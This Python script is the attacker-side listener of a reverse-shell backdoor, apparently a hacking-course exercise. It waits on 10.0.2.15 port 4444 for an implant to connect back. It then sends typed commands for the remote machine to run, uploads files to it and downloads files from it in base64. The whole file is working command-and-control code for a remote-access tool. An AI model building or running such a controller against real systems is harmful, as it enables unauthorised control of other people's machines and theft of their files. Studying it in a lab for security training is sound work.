#!/usr/bin/python

import socket
import json
import base64
import traceback


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # options to enable reuse of sockets, if connection drops etc.
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        # 0 is the backlog - no. of connections that can be queued before system starts refusing
        listener.listen(0)  # sets up and start TCP listener
        print("[+] Waiting for Incoming Connection")
        # passively accept TCP client connection, waiting until connection arrives (blocking)
        self.connection, address = listener.accept()
        print("[+] Got a Connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))  # sends TCP message

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')  # receives TCP message
                return json.loads(json_data)
            except ValueError:  # continue receiving until full data received
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode('ascii'))

                result = self.execute_remotely(command)
                # print(result)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)

            except Exception as e:
                print(e)
                traceback.print_tb(e.__traceback__)
                result = "[-] Error during command execution"

            print(result)


my_listener = Listener("10.0.2.15", 4444)
my_listener.run()
